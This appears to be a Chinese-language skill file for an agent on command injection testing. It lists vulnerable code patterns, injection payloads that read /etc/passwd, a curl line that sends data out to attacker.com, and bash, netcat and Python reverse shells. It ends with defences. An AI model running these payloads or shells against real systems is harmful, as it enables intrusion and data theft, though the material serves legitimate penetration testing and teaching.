---
id: command-injection-testing
name: Command Injection Testing
description: 命令注入漏洞测试的专业技能和方法论
version: 1.0.0
aliases:
  - command-injection
  - cmdi
tags:
  - rce
  - injection
  - shell
target_types:
  - web
  - api
---

# 命令注入漏洞测试

## 概述

命令注入是一种通过应用程序执行系统命令的漏洞。当应用程序将用户输入直接传递给系统命令时，攻击者可以执行任意命令。

## 漏洞原理

**危险代码示例：**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## 测试方法

### 1. 识别命令执行点
- Ping功能
- DNS查询
- 文件操作
- 系统信息
- 日志查看
- 备份恢复

### 2. 基础检测
**测试命令分隔符：**
```
;  命令分隔符（Linux/Windows）
&  后台执行（Linux/Windows）
|  管道符（Linux/Windows）
&& 逻辑与（Linux/Windows）
|| 逻辑或（Linux/Windows）
`  命令替换（Linux）
$() 命令替换（Linux）
```

**测试Payload：**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. 盲命令注入
**时间延迟检测：**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
```

**外带数据：**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
```

## 利用技术

### 反弹Shell
**Bash：** `bash -i >& /dev/tcp/attacker.com/4444 0>&1`

**Netcat：** `nc -e /bin/bash attacker.com 4444`

**Python：** 
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker.com",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## 工具使用

### Commix
```bash
# 基础扫描
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# 获取Shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

## 防护措施

1. **避免命令执行** - 使用API替代系统命令
2. **输入验证** - 使用正则验证IP等输入
3. **参数化命令** - 使用参数列表而非字符串拼接
4. **白名单验证** - 只允许特定的命令和选项
5. **最小权限** - 使用低权限用户运行应用
